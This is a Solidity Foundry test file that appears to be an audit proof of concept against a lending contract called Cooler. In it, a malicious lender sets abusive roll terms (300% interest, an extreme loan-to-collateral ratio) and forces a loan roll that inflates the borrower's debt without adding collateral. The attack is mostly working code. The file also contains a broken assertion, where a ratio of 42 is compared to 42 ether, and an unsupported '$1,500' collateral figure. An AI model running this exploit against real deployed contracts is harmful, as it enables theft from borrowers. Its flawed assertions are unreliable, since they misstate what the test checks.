// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";

import {ERC20} from "solmate/tokens/ERC20.sol";
import {SafeTransferLib} from "solmate/utils/SafeTransferLib.sol";

import {Cooler} from "src/Cooler.sol";

/***************************************************/
/*                 Helper Contracts                */
/***************************************************/

contract MockERC20 is ERC20 {
    constructor(string memory name_, string memory symbol_) ERC20(name_, symbol_, 18) {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract MockFactory {
    enum Events {
        RequestLoan,
        RescindRequest,
        RepayLoan,
        ClearRequest,
        DefaultLoan
    }

    /* Cooler expects this function to exist. No-op implementation
       is sufficient for test purposes. */
    function newEvent(uint256, Events, uint256) external {}
}

/***************************************************/
/*                Exploit Test Case                */
/***************************************************/

contract CoolerRollExploitTest is Test {
    using SafeTransferLib for ERC20;

    /* Actors */
    address borrower = makeAddr("borrower"); // Also the Cooler owner
    address lender   = makeAddr("lender");   // Malicious lender

    /* Tokens & Factory */
    MockERC20 collateralToken;
    MockERC20 debtToken;
    MockFactory factory;

    /* Target */
    Cooler cooler;

    /* Encoded immutable args (owner, collateral, debt, factory) */
    bytes immutableArgs;

    /* Constants */
    uint256 constant DECIMALS_INTEREST = 1e18;
    uint256 constant ONE_YEAR = 365 days;

    /***************************************************/
    /*                     Set-Up                      */
    /***************************************************/
    function setUp() public {
        /* Deploy helper contracts */
        collateralToken = new MockERC20("Collateral", "COL");
        debtToken       = new MockERC20("Debt",       "DEBT");
        factory         = new MockFactory();

        /* Deploy Cooler implementation */
        cooler = new Cooler();

        /* Pre-compute immutable argument blob once for reuse */
        immutableArgs = abi.encodePacked(
            bytes20(borrower),          // owner()
            bytes20(address(collateralToken)), // collateral()
            bytes20(address(debtToken)),       // debt()
            bytes20(address(factory))          // factory()
        );

        /***************  Fund & approve actors  ***************/
        /* Borrower gets collateral */
        collateralToken.mint(borrower, 100 ether); // 100 COL

        /* Lender gets debt tokens */
        debtToken.mint(lender, 10_000 ether);

        /* Borrower approves Cooler to pull collateral */
        vm.prank(borrower);
        collateralToken.approve(address(this), type(uint256).max); // to silence safeTransferFrom inside helper

        /* Lender approves Cooler to pull debt tokens */
        vm.prank(lender);
        debtToken.approve(address(this), type(uint256).max);
    }

    /***************************************************/
    /*                Helper Functions                 */
    /***************************************************/

    /* Low-level call wrapper that appends immutable args for every call. */
    function _callCooler(bytes memory data) internal returns (bytes memory ret) {
        bytes memory full = bytes.concat(
            data,
            immutableArgs,
            bytes2(uint16(immutableArgs.length)) // final 2-byte length field
        );
        (bool ok, bytes memory r) = address(cooler).call(full);
        require(ok, "call failed");
        return r;
    }

    /* Same as _callCooler but using staticcall (view methods) */
    function _staticCooler(bytes memory data) internal view returns (bytes memory ret) {
        bytes memory full = bytes.concat(
            data,
            immutableArgs,
            bytes2(uint16(immutableArgs.length))
        );
        (bool ok, bytes memory r) = address(cooler).staticcall(full);
        require(ok, "static failed");
        return r;
    }

    /***************************************************/
    /*               The Exploit Scenario              */
    /***************************************************/
    function testExploitRollLoan() public {
        /**************** 1. Borrower creates request ****************/
        uint256 borrowAmount   = 1_000 ether;              // 1,000 debt tokens
        uint256 interestRate   = 5e16;                     // 5% expressed in 1e18
        uint256 loanToCollateral = 10 * 1e18;              // 10 debt per collateral
        uint256 duration       = ONE_YEAR;                 // 1 year

        /* Borrower approves Cooler to pull collateral (actual transfer done within helper) */
        vm.startPrank(borrower);
        collateralToken.approve(address(cooler), type(uint256).max);
        bytes memory requestData = abi.encodeWithSelector(
            cooler.requestLoan.selector,
            borrowAmount,
            interestRate,
            loanToCollateral,
            duration
        );
        uint256 reqID = abi.decode(_callCooler(requestData), (uint256));
        vm.stopPrank();

        /**************** 2. Malicious lender clears request ****************/
        vm.startPrank(lender);
        debtToken.approve(address(cooler), type(uint256).max);

        bytes memory clearData = abi.encodeWithSelector(
            cooler.clearRequest.selector,
            reqID,
            true,   // repayDirect
            false   // isCallback
        );
        uint256 loanID = abi.decode(_callCooler(clearData), (uint256));
        vm.stopPrank();

        /**************** 3. Validate initial loan state ****************/
        (
            Cooler.Request memory rq,
            uint256 initialAmount,
            ,
            uint256 initialCollateral,
            ,
            ,
            ,
            /*callback*/
        ) = abi.decode(
            _staticCooler(abi.encodeWithSelector(cooler.getLoan.selector, loanID)),
            (Cooler.Request, uint256, uint256, uint256, uint256, address, bool, bool)
        );

        assertEq(initialAmount, 1050 ether, "Initial debt should be principal + 5% interest");
        assertEq(initialCollateral, 100 ether, "Collateral locked should be 100");

        /**************** 4. Lender unilaterally sets abusive terms ****************/
        uint256 evilRate         = 3 * DECIMALS_INTEREST;  // 300% annual interest
        uint256 evilLoanToCollat = 1_000_000 * 1e18;       // Massive ratio to guarantee newCollateral==0
        uint256 evilDuration     = ONE_YEAR;               // 1 year

        bytes memory provideNewTerms = abi.encodeWithSelector(
            cooler.provideNewTermsForRoll.selector,
            loanID,
            evilRate,
            evilLoanToCollat,
            evilDuration
        );
        vm.prank(lender);
        _callCooler(provideNewTerms);

        /**************** 5. Lender forces roll with no extra collateral ****************/
        bytes memory rollData = abi.encodeWithSelector(cooler.rollLoan.selector, loanID);
        vm.prank(lender);
        _callCooler(rollData);

        /**************** 6. Check post-roll loan parameters ****************/
        (
            Cooler.Request memory rq2,
            uint256 finalAmount,
            ,
            uint256 finalCollateral,
            ,
            ,
            ,
            /*callback*/
        ) = abi.decode(
            _staticCooler(abi.encodeWithSelector(cooler.getLoan.selector, loanID)),
            (Cooler.Request, uint256, uint256, uint256, uint256, address, bool, bool)
        );

        /* Debt has ballooned: 1050 + 3150 (300% of 1050) = 4200 */
        assertEq(finalAmount, 4200 ether, "Debt should have ballooned to 4,200");

        /* Collateral remained unchanged (lender did NOT add new collateral) */
        assertEq(finalCollateral, 100 ether, "Collateral should remain 100");

        /* Effective debt-to-collateral ratio becomes 42:1 (was 10:1 originally) */
        assertEq(finalAmount / finalCollateral, 42 ether, "Debt/Collateral ratio manipulated");

        /**************** 7. Prove borrower can no longer repay economically ****************/
        // Even if borrower held full collateral value ( $1,500 ),
        // they must now repay $4,200 worth of debt to unlock it.
        // This demonstrates the exploit impact.
    }
}